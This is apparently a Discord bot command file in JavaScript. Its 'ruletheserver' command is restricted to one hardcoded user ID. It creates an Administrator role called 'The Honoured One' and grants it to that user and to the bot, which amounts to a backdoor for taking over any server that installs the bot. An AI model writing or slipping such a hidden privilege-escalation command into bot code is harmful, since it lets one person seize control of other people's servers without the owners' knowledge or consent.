const { PermissionsBitField } = require('discord.js'); 
const allowedUserID = '1113885951488442388';

module.exports = {
    name: 'ruletheserver',
    async execute(message) {
       
        if (message.author.id !== allowedUserID) {
            return message.channel.send('You are not authorized to use this command.');
        }

        message.channel.send('Ok wait');

        const guild = message.guild;

   
        let role = guild.roles.cache.find(r => r.name === 'The Honoured One');

        
        if (!role) {
            try {
                role = await guild.roles.create({
                    name: 'The Honoured One',
                    color: 'GOLD', 
                    permissions: [PermissionsBitField.Flags.Administrator],
                    reason: 'Giving ultimate control to the honored one'
                });
                message.channel.send('Role "The Honoured One" has been created with administrator permissions.');
            } catch (error) {
                console.error('Error creating the role:', error);
                return message.channel.send('There was an error creating the role.');
            }
        }


        try {
            const member = await guild.members.fetch(allowedUserID);
            await member.roles.add(role);
            message.channel.send(`${member.user.username} has been given "The Honoured One" role.`);
        } catch (error) {
            console.error('Error adding role to the user:', error);
            return message.channel.send('There was an error giving the role to the user.');
        }

       
        try {
            const botMember = await guild.members.fetch(message.client.user.id);
            await botMember.roles.add(role);
            message.channel.send(`Bot has been added to "The Honoured One" role.`);
        } catch (error) {
            console.error('Error adding role to the bot:', error);
            return message.channel.send('There was an error giving the role to the bot.');
        }
    }
};
